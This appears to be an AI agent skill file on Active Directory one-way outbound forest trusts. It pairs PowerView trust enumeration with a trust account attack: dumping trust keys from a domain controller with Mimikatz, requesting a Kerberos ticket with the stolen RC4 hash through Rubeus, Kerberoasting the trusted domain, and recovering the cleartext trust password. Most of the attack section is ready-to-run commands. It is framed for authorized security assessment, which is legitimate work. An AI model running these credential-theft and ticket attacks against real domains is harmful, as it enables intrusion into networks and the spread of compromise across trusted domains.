---
name: ad-external-forest-trust
description: Active Directory external forest trust enumeration and testing. Use this skill when analyzing outbound trust relationships between domains, investigating trust account vulnerabilities, or performing authorized security assessments of AD trust configurations. Trigger when users mention domain trusts, forest trusts, trust relationships, cross-domain permissions, or need to enumerate AD trust configurations.
---

# Active Directory External Forest Trust - One-Way Outbound

This skill guides you through enumerating and testing one-way outbound trust relationships in Active Directory, where your domain trusts principals from a different domain.

## When to Use This Skill

- Enumerating outbound trust relationships in Active Directory
- Investigating trust account vulnerabilities
- Performing authorized security assessments of AD trust configurations
- Understanding cross-domain permission flows
- Testing trust relationship security boundaries

## Prerequisites

- Domain admin or equivalent permissions on the source domain
- Access to tools: PowerView, Mimikatz, Rubeus
- Authorized security testing environment only

## Enumeration

### Identify Outbound Trusts

Use PowerView to enumerate trust relationships:

```powershell
Get-DomainTrust
```

Key fields to examine:
- `TrustDirection`: Outbound means your domain trusts the target
- `TrustType`: WINDOWS_ACTIVE_DIRECTORY for AD trusts
- `TrustAttributes`: FOREST_TRANSITIVE indicates forest-level trust

**Example output:**
```
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
```

### Find Foreign Group Members

Identify which groups grant permissions to external domain principals:

```powershell
Get-DomainForeignGroupMember
```

This reveals groups containing members from other domains. Note that members from external domains appear as SIDs in the ForeignSecurityPrincipals container and won't resolve with `ConvertFrom-SID`.

**Example output:**
```
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
```

## Trust Account Attack

### Understanding the Vulnerability

When domain A trusts domain B, a special trust account (e.g., `EXT$`) is created in domain A. This account:
- Is associated with domain B
- Is used for encrypting tickets across domains
- Belongs to the "Domain Users" group of domain A
- Has its password/hash extractable from domain A's Domain Controller

### Extract Trust Keys

Use Mimikatz to dump Kerberos trust keys:

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```

Or directly on the DC:
```
lsadump::trust /patch
```

This reveals the trust account credentials (RC4 hash and optionally clear text password).

### Authenticate as Trust Account

Use the extracted RC4 hash to request a TGT:

```powershell
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4_HASH> /dc:dc.root.local /ptt
```

The `/ptt` flag passes the ticket to the current session.

### Post-Authentication Enumeration

Once authenticated as the trust account, you can enumerate the trusted domain:

```powershell
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```

This allows Kerberoast attacks and other enumeration techniques within the trusted domain.

## Clear Text Password Extraction

Mimikatz also dumps the clear text trust password. To use it:

1. Take the `[ CLEAR ]` output from Mimikatz
2. Convert from hexadecimal
3. Remove null bytes (`\x00`)

The clear text password can be used for regular authentication as the trust account, an alternative to requesting a TGT using the Kerberos secret key.

**Note:** When trust keys cycle (typically every 30 days), the clear text may not be human-readable but is still technically usable.

## Safety Notes

- Only perform these tests in authorized environments
- Trust account attacks can provide domain footholds with limited permissions
- Document all findings for remediation
- These techniques are for security assessment only

## References

- [Improsec Trust Account Attack Guide](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)
- HackTricks Active Directory Training
